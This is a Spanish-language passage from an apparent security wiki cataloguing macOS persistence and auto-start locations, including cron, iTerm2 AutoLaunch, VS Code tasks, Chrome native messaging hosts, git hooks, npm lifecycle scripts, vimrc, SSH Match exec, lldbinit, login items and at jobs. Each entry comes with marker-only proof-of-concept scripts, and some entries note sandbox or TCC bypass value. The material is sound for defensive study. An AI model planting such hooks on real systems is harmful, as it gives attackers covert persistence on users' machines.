Lista los trabajos de cron del **usuario actual** con:

```bash
crontab -l
```

El plist de launchd del daemon cron del sistema tiene una entrada `QueueDirectories` para `/usr/lib/cron/tabs`; allí se guardan los crontabs de los usuarios instalados. Para inspeccionar los crontabs de otros usuarios se necesitan privilegios de root:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

En una cuenta desechable, se puede instalar una entrada de cron de usuario que solo contenga un marcador con `crontab` y eliminarla después de observarla. Ejecutar `crontab <file>` **reemplaza todo el crontab existente de la cuenta**, así que guárdalo y restáuralo si la cuenta no es desechable:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 solía tener permisos de TCC concedidos

#### Ubicaciones

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Activador**: Iniciar iTerm2 con un script elegible de Python API en esa carpeta
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Activador**: Iniciar iTerm2; el hook de inicio de AppleScript está documentado por separado
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Activador**: Crear una sesión con el perfil cuyo comando o texto inicial invoque el payload

#### Descripción y explotación

La [guía actual de Python API de iTerm2](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) documenta scripts de **Python** de ejecución automática en `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. No establece que se ejecute un archivo `.sh` ejecutable arbitrario en esa carpeta. Para una cuenta desechable, guarda esto como `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

La [guía actual de AppleScript de iTerm2](https://iterm2.com/documentation-scripting.html) documenta por separado `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, con una ruta alternativa heredada `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` cuando la carpeta moderna no existe. Un AppleScript que solo contiene un marcador es:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Estos ejemplos de scripts se comprobaron con la documentación de iTerm2; no se ejecutaron en la sesión de escritorio activa. Después de probarlos en una cuenta desechable, elimina el script de prueba y `/tmp/ht-iterm-autolaunch-marker` o `/tmp/iterm2-autolaunchscpt`, respectivamente.

Las preferencias de iTerm2 ubicadas en **`~/Library/Preferences/com.googlecode.iterm2.plist`** pueden especificar un comando de perfil o texto inicial. Este último se escribe en una sesión; su ejecución depende de que un shell lo interprete. [La documentación de perfiles de iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) describe el comando que se ejecuta cuando se crea una sesión nueva con ese perfil.

Esta opción se puede configurar en los ajustes de iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Y el comando se refleja en las preferencias:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Para una evaluación segura, inspecciona el perfil elegido en los ajustes de iTerm2 o lee una copia de su archivo de preferencias. Cambiar `Initial Text` en un perfil activo afectaría las sesiones de un usuario, así que no se modificó ninguna preferencia en el Mac de investigación.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Pero xbar debe estar instalado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
  - Solicita permisos de Accessibility

#### Ubicación

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Activación**: Una vez que se ejecuta xbar

#### Descripción

Si el popular programa [**xbar**](https://github.com/matryer/xbar) está instalado, es posible escribir un script de shell en **`~/Library/Application\ Support/xbar/plugins/`** que se ejecutará cuando se inicie xbar:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Útil para bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Pero Hammerspoon debe estar instalado
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Solicita permisos de Accesibilidad

#### Ubicación

- **`~/.hammerspoon/init.lua`**
  - **Activador**: Una vez que se ejecuta Hammerspoon

#### Descripción

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) funciona como una plataforma de automatización para **macOS**, que utiliza el **lenguaje de scripting LUA**. Cabe destacar que permite integrar código AppleScript completo y ejecutar scripts de shell, lo que amplía considerablemente sus capacidades de scripting.<sup>[[13]](#references)</sup>

La aplicación busca un único archivo, `~/.hammerspoon/init.lua`, y, al iniciarse, ejecuta el script.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Útil para bypass del sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Pero BetterTouchTool debe estar instalado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
  - Solicita permisos de Automation-Shortcuts y Accessibility

#### Ubicación

- Un archivo de script **ya referenciado** por un preset habilitado de BetterTouchTool, o la configuración de ese preset en `~/Library/Application Support/BetterTouchTool/`. La ruta exacta del script depende de cómo se haya configurado el preset.

[La referencia de acciones de BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) documenta las acciones de shell-script y background-command. El evento de teclado, ratón, touch, widget u otro evento configurado debe producirse mientras el preset correspondiente está activo; [su guía de triggers](https://docs.folivora.ai/docs/configuration/new-trigger/) muestra esta relación. Un archivo aleatorio en el directorio de soporte de la aplicación no es un trigger. Una acción ya configurada que carga un script externo con permisos de escritura es un objetivo más específico de escritura a ejecución. El código se ejecuta con la cuenta del usuario de BetterTouchTool, sujeto a los permisos reales de macOS. BetterTouchTool no estaba presente en `/Applications` en el Mac de investigación, por lo que no se modificó ni ejecutó ningún preset localmente.

### Alfred

- Útil para bypass del sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Pero Alfred debe estar instalado
- Bypass de TCC: [✅](https://emojipedia.org/check-mark-button)
  - Solicita permisos de Automation, Accessibility e incluso Full-Disk access

#### Ubicación

- Un script o archivo **ya referenciado** por un workflow de Alfred instalado, o ese workflow dentro del directorio `Alfred.alfredpreferences` configurado por el usuario. El directorio de preferencias puede estar sincronizado y no tiene una ruta universal fija.

[La guía de workflows de Alfred](https://www.alfredapp.com/help/workflows/) describe el requisito de Powerpack y la instalación mediante su interfaz. Debe activarse un hotkey, keyword u otro trigger configurado del workflow instalado; [el ejemplo de hotkey de Alfred](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) muestra una acción de script. [La referencia del entorno de Alfred](https://www.alfredapp.com/help/workflows/script-environment-variables/) expone la ruta de preferencias seleccionada como `alfred_preferences`. Colocar un archivo de workflow sin registrar en un directorio arbitrario no demuestra que se vaya a instalar ni ejecutar. El código se ejecuta como el usuario que inició sesión en Alfred, con sus permisos reales de macOS. Alfred no estaba presente en `/Applications` en el Mac de investigación, por lo que esta posibilidad se evaluó únicamente a partir de la documentación.

### Raycast Script Commands y actualización de extensiones

- **Objetivo de escritura:** Un script ejecutable en un directorio **ya añadido** en Raycast Settings → Script Commands. Raycast no busca en un directorio arbitrario recién creado. [La guía de Script Commands de Raycast](https://manual.raycast.com/script-commands) documenta el registro de directorios.
- **Trigger e identidad:** Un usuario invoca el comando indexado, un hotkey o fallback configurado lo invoca, o Raycast actualiza un script `inline` según su `@raycast.refreshTime` configurado. El script se ejecuta como el usuario que inició sesión en Raycast, mediante su intérprete. La [referencia de metadata upstream](https://github.com/raycast/script-commands#metadata) limita la actualización automática a los comandos inline, y [el manifest de extensiones de Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) admite por separado un `interval` para comandos de extensiones instaladas de tipo `no-view` o `menu-bar`. Añadir simplemente un comando de script normal no programa su ejecución.

Para una cuenta desechable con un directorio de scripts registrado, se puede usar este script inline que solo crea un marcador:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Guárdalo en el directorio registrado, haz que sea ejecutable y permite que Raycast lo actualice. Luego elimina ese archivo y `/tmp/ht-raycast-refresh-marker`. Raycast no estaba en su ubicación habitual con el nombre `/Applications` en el Mac de investigación, así que esto está documentado, pero no se ejecutó localmente. El acceso a Accesibilidad, Automatización y archivos sigue sujeto a los avisos de permisos de macOS.

### Tareas automáticas de workspace de Visual Studio Code

- **Destino de escritura:** `.vscode/tasks.json` dentro de un workspace que abrirá el usuario.
- **Activador:** Abrir ese workspace en VS Code, pero solo si la carpeta es de confianza **y** se han permitido las tareas automáticas. Un workspace que no sea de confianza nunca ejecuta tareas automáticas; la configuración predeterminada pregunta al usuario antes de la primera ejecución automática. La [documentación de tareas de VS Code](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) y la [documentación de Workspace Trust](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) describen ambos requisitos.
- **Identidad de ejecución:** La cuenta del usuario de VS Code, mediante el proceso de tareas configurado. Es una ejecución específica de la aplicación, no persistencia de inicio de sesión.

En un **workspace nuevo y desechable**, coloca esta tarea que solo crea un marcador en `.vscode/tasks.json`:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Después de abrir el workspace de confianza y permitir las tareas automáticas, comprueba si existe `.autostart-task-ran`. Elimina la entrada de la tarea y el marcador para limpiar. **Esto se verificó con la documentación de Microsoft y el bundle instalado de VS Code 1.139.1; no se ejecutó en la sesión de escritorio activa.**

### Hosts de native messaging de Chrome

- **Destino de escritura:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` para el usuario actual, o `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` para todos los usuarios (se necesita permiso de escritura de administrador). Chromium y Chrome for Testing usan directorios diferentes; consulta la [tabla de rutas actual de Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Activador:** Una extensión instalada de Chrome con el permiso `nativeMessaging` llama a `chrome.runtime.connectNative()` o `chrome.runtime.sendNativeMessage()` usando el nombre exacto del host indicado en el manifiesto. Entonces Chrome inicia el ejecutable del host. Abrir Chrome por sí solo no ejecuta un nuevo host nativo arbitrario; crear un manifiesto sin una extensión que lo invoque no hace nada. La [guía de native messaging de Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) documenta este intercambio.
- **Identidad de ejecución:** La cuenta del usuario de Chrome. El manifiesto debe indicar una ruta absoluta al ejecutable y permitir explícitamente el origen de la extensión que lo invoca.

En una cuenta de navegador desechable con una extensión de prueba, el siguiente par de archivos demuestra el vínculo entre escritura y ejecución. El nombre de archivo del manifiesto debe coincidir con su `name`, y hay que sustituir `TEST_EXTENSION_ID` por el ID real de esa extensión:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Guarda este JSON en `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. El ejecutable que solo sirve como marcador en el `path` del manifiesto puede contener:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Después de que la extensión de prueba llame a `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` desde su service worker o la página de la extensión, el marcador demuestra que el host se inició. Este host mínimo no implementa el protocolo de respuesta de Chrome con prefijo de longitud, por lo que la extensión puede informar de un error de mensajería después de escribir el marcador. Elimina el manifest, el host y el marcador de prueba para limpiar. En macOS 26.5.2, la app de Chrome y ambos directorios de manifest estaban presentes; **el perfil activo de Chrome no se modificó ni se utilizó**.

### Comandos de eventos de teclas de Karabiner-Elements

- **Destino de escritura:** `~/.config/karabiner/karabiner.json` en una cuenta donde Karabiner-Elements esté instalado y en ejecución. [La guía de ubicación de archivos de Karabiner](https://karabiner-elements.pqrs.org/docs/json/location/) indica que la app supervisa y vuelve a cargar este archivo después de una escritura. Los archivos JSON de `assets/complex_modifications` son únicamente presets que se pueden importar; escribir uno allí no habilita una regla.
- **Activador:** El evento de tecla configurado una vez activa la regla. La [referencia de `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) documenta la ejecución de comandos. Esto no ejecuta código al iniciar sesión ni cada vez que se escribe en un archivo.
- **Identidad de ejecución:** El usuario que inició sesión y que ejecuta el proceso de usuario de Karabiner. Los permisos otorgados a la propia app y cualquier acceso de TCC dependen de la app y de la versión.

Para una cuenta de prueba desechable, añade este objeto de regla al array `complex_modifications.rules` del perfil seleccionado en `karabiner.json`, conservando el resto de ese perfil. Pulsa F18 para crear un marcador inocuo y luego elimina esta regla y el marcador. Elegir F18 evita reemplazar una tecla de escritura habitual:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements no estaba instalado en `/Applications` en la máquina de prueba con macOS 26.5.2, por lo que esto es una PoC respaldada por documentación, no un resultado de ejecución local.

### Git hooks en un repositorio local

- **Destino de escritura:** Un hook ejecutable como `<repo>/.git/hooks/post-checkout`. Si ya se configuró `core.hooksPath`, usa en su lugar ese directorio configurado. Un hook confirmado como un archivo fuente normal con seguimiento no se instala automáticamente en un clone.
- **Activador:** La operación de Git correspondiente. Por ejemplo, `post-checkout` se ejecuta después de `git checkout` o `git switch`, y también puede ejecutarse después de crear un clone o worktree. La [referencia de hooks de Git](https://git-scm.com/docs/githooks) enumera los eventos y el requisito del bit ejecutable; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) cambia el directorio de búsqueda.
- **Identidad de ejecución:** La cuenta que ejecuta Git. El hook solo puede ejecutarse si el directorio de hooks efectivo del repositorio tiene permisos de escritura para el actor y el usuario realiza posteriormente la operación de Git correspondiente.

Esta PoC que solo crea un marcador genera un repositorio totalmente desechable, instala un hook y cambia de rama. Se ejecutó correctamente con Apple Git 2.50.1 en macOS 26.5.2:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### Scripts de lifecycle de npm en un proyecto

- **Objetivo de escritura:** El mapa `scripts` de `package.json` de un proyecto con permisos de escritura, o un paquete de dependencia instalado cuyo script de lifecycle ejecutará el usuario. Este es un hook del flujo de trabajo de desarrollo, no una ejecución al abrir un directorio.
- **Activación e identidad:** Un `npm install` o `npm ci` posterior, con los scripts de lifecycle permitidos, ejecuta `preinstall`, `install` y `postinstall` como el usuario que invoca npm. Un `npm run <name>` normal también ejecuta los scripts `pre<name>` y `post<name>` correspondientes. [La referencia de lifecycle de npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) enumera los eventos; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) puede suprimir los scripts de lifecycle de instalación. La versión y la configuración de políticas pueden cambiar lo que está permitido, así que comprueba la versión de npm del objetivo.

Esta PoC de solo marcador se ejecutó con npm local en un directorio vacío y desechable. No descarga dependencias ni modifica el proyecto de un usuario:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Esto es distinto de los archivos de inicio del intérprete de Python: npm debe realizar la acción de instalación o ejecución pertinente, mientras que el código de `site` de Python puede cargarse durante una invocación normal del intérprete. Del mismo modo, los destinos genéricos de `Makefile` y las definiciones de tareas de compilación requieren que el usuario o una herramienta ya configurada invoque ese destino; no son rutas independientes de inicio automático del sistema operativo.

### Configuración de inicio de Vim

- **Destino de escritura:** `~/.vimrc` para el usuario que iniciará Vim (u otro archivo de inicio seleccionado según el orden de inicialización de Vim). [La referencia de inicio de Vim](https://vimhelp.org/starting.txt.html) documenta el archivo y las anulaciones `VIMINIT`/`EXINIT`.
- **Activador:** Un inicio normal posterior de Vim que cargue esta configuración. La opción `-u NONE` de Vim omite el vimrc del usuario. Esta es una ejecución específica del editor, no un activador de inicio de sesión del sistema operativo.
- **Identidad de ejecución:** La cuenta del usuario de Vim.

La siguiente PoC aislada se ejecutó con `/usr/bin/vim` de macOS; no escribe preferencias reales de Vim ni documentos abiertos:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim tiene una ruta de configuración de usuario independiente, `$XDG_CONFIG_HOME/nvim/init.lua` o `init.vim`, y también carga scripts de sus directorios `plugin/` de runtime, según su [documentación de inicio](https://neovim.io/doc/user/starting/). Neovim no estaba instalado en la máquina de prueba con macOS 26.5.2, así que esta variante no se ejecutó allí.

### Comandos de configuración del cliente SSH

- **Destino de escritura:** `~/.ssh/config` u otro archivo que ya incluya. Este es un archivo de configuración del **cliente**; es independiente del archivo del lado del servidor `~/.ssh/rc` que se describe más abajo.
- **Activación:** Una invocación de `ssh` que coincida. `Match exec` ejecuta un comando local mientras el cliente evalúa su configuración, incluso con `ssh -G`, que muestra la configuración sin conectarse. `ProxyCommand` se ejecuta cuando el cliente establece una conexión que coincide. `LocalCommand` se ejecuta solo después de una conexión exitosa y requiere `PermitLocalCommand yes` (el valor predeterminado es `no`). Estos mecanismos tienen distintos tiempos de ejecución y requisitos previos; escribir la configuración por sí solo no los ejecuta. Consulta la documentación upstream de [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Identidad de ejecución:** El usuario local que ejecuta `ssh`. Se necesita un host coincidente, un archivo de configuración aplicable y cualquier conexión requerida. `ssh -F` puede seleccionar otro archivo de configuración.

Esta PoC que solo escribe un marcador se ejecutó con el cliente SSH de Apple en macOS 26.5.2. `-G` prueba `Match exec` sin establecer una conexión de red ni leer la configuración SSH real del usuario:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Archivos de inicialización del debugger

- **Destino de escritura:** `~/.lldbinit` o el archivo específico de la aplicación con mayor prioridad, como `~/.lldbinit-lldb`. LLDB lee uno al iniciarse el debugger. De forma predeterminada, no se ejecuta un `.lldbinit` del directorio actual; el usuario debe habilitar `target.load-cwd-lldbinit` o pasar `--local-lldbinit`. Consulta el [manual de LLDB](https://lldb.llvm.org/man/lldb.html).
- **Activación e identidad:** El usuario inicia LLDB sin `--no-lldbinit`; los comandos se ejecutan como ese usuario. Abrir un proyecto no implica que se ejecute su `.lldbinit`.

La siguiente prueba, que solo usó un marcador, se ejecutó con LLDB en macOS 26.5.2, usando un directorio de inicio y un directorio de trabajo aislados:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

For **GDB**, la [documentación de inicio upstream](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) enumera `$HOME/Library/Preferences/gdb/gdbinit` y luego `~/.gdbinit` en macOS. Un `.gdbinit` en el directorio actual está sujeto a [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), y `-nx`/`-nh` suprimen los archivos de inicialización. GDB no estaba instalado en el Mac de prueba, así que esta variante no se ejecutó localmente.

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Pero ssh debe estar habilitado y usarse
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - SSH solía tener acceso FDA

#### Ubicación

- **`~/.ssh/rc`**
  - **Activación**: Inicio de sesión mediante ssh
- **`/etc/ssh/sshrc`**
  - Se requiere root
  - **Activación**: Inicio de sesión mediante ssh

> [!CAUTION]
> Para activar ssh se requiere Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Descripción y explotación

De forma predeterminada, a menos que se indique `PermitUserRC no` en `/etc/ssh/sshd_config`, cuando un usuario **inicia sesión mediante SSH**, se ejecutan los scripts **`/etc/ssh/sshrc`** y **`~/.ssh/rc`**.<sup>[[14]](#references)</sup>

### **Elementos de inicio**

Informe: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Pero debes ejecutar `osascript` con argumentos
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicaciones

- **Aplicación auxiliar registrada para elementos de inicio:** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (ubicación común en paquetes).
  - **Activación:** El registro puede iniciar la aplicación auxiliar inmediatamente; luego se inicia en los siguientes inicios de sesión del usuario, sujeto a aprobación.
- **Agente/daemon incluido en el paquete y registrado:** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` o `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Activación:** Un agente aprobado puede iniciarse al registrarse y en los siguientes inicios de sesión; un daemon aprobado se inicia durante el arranque. Un daemon requiere aprobación de administrador.

#### Descripción

En **Ajustes del Sistema → General → Elementos de inicio y extensiones**, los usuarios pueden revisar los elementos de inicio y en segundo plano. macOS 13 y versiones posteriores ofrecen [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) para registrar elementos de inicio, agentes de inicio y daemons incluidos en un paquete. El [comportamiento de `register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) varía según el tipo y el estado de aprobación. **Escribir una aplicación auxiliar en un paquete de aplicación no basta para registrar un nuevo elemento de inicio.** A la inversa, si el ejecutable de una aplicación auxiliar ya registrada tiene permisos de escritura, modificarlo puede afectar su siguiente inicio sin necesidad de un nuevo registro; primero verifica la ruta real y las comprobaciones de firma de código.

A continuación se muestra una forma de solo lectura de buscar aplicaciones auxiliares incluidas en paquetes en un Mac; no registra ni inicia ninguna de ellas:

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Para un plist de lanzamiento incluido en un bundle, resuelve `BundleProgram` **en relación con la raíz del bundle de la app** (por ejemplo, `Contents/MacOS/Helper`), tal como especifica la [guía de migración de Service Management de Apple](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Un inventario de solo lectura de `/Applications` en el Mac de investigación encontró 14 entradas de helper incluidas y cinco declaraciones `BundleProgram`; los cinco destinos se resolvieron y dos superaron una comprobación de escritura por parte del usuario. Esa comprobación **no** demuestra que alguno de los dos helpers esté registrado, habilitado, sea ejecutable tras la validación de la firma o accesible desde un sandbox. `sfltool dumpbtm` mostró 150 registros con nombre en este Mac; es una ayuda para la inspección, no una prueba de que todos los registros estén en ejecución.

Los elementos de inicio de sesión más antiguos también se pueden gestionar mediante eventos de Apple. Es posible listarlos, añadirlos y eliminarlos desde la línea de comandos, aunque añadirlos modifica la configuración persistente de inicio de sesión del usuario y puede requerir la aprobación de Automation:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` es un detalle de implementación, no una ubicación admitida para instalar un payload simplemente escribiendo un archivo. La API anterior `SMLoginItemSetEnabled` ha sido reemplazada para los nuevos helpers por `SMAppService`; la ruta anterior de la página `/var/db/com.apple.xpc.launchd/loginitems.501.plist` no estaba presente en la máquina de prueba con macOS 26.5.2. Al evaluar los login items modernos, utiliza la API de registro y el estado de la interfaz del sistema, no una ruta de base de datos supuesta.

### ZIP como Login Item

(Consulta la sección anterior sobre Login Items; esto es una extensión)

Si almacenas un archivo **ZIP** como **Login Item**, **`Archive Utility`** lo abrirá. Si el ZIP, por ejemplo, estaba guardado en `~/Library` y contenía la carpeta **`LaunchAgents/file.plist`** con un backdoor, se creará esa carpeta (no existe de forma predeterminada) y se añadirá el plist. Así, la próxima vez que el usuario vuelva a iniciar sesión, **se ejecutará el backdoor indicado en el plist**.

Otra opción sería crear los archivos **`.bash_profile`** y **`.zshenv`** dentro del HOME del usuario; así, esta técnica seguiría funcionando si la carpeta LaunchAgents ya existe.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Útil para evadir el sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Pero necesitas **ejecutar** **`at`** y debe estar **habilitado**
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Ubicación

- Necesitas **ejecutar** **`at`** y debe estar **habilitado**

#### **Descripción**

Las tareas de `at` están diseñadas para **programar tareas de ejecución única** en momentos determinados. A diferencia de los cron jobs, las tareas de `at` se eliminan automáticamente después de ejecutarse. Es importante tener en cuenta que estas tareas persisten tras los reinicios del sistema, lo que las convierte en posibles riesgos de seguridad en ciertas condiciones.<sup>[[16]](#references)</sup>

El `com.apple.atrun.plist` incluido tiene `Disabled = true`, pero launchd mantiene por separado las anulaciones efectivas de habilitación o deshabilitación. En la máquina de prueba con macOS 26.5.2, `launchctl print-disabled system` informó que `com.apple.atrun` estaba **habilitado**, a pesar de esa clave incluida. Comprueba el estado efectivo antes de afirmar que los jobs de `at` se ejecutarán:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Un administrador puede habilitar un servicio `atrun` deshabilitado con `launchctl`; el siguiente ejemplo histórico cambia el estado de un servicio del sistema y **no se ejecutó** en el Mac de investigación:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Esto creará un archivo en 1 hora:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Comprueba la cola de trabajos usando `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Arriba podemos ver dos trabajos programados. Podemos mostrar los detalles del trabajo usando `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
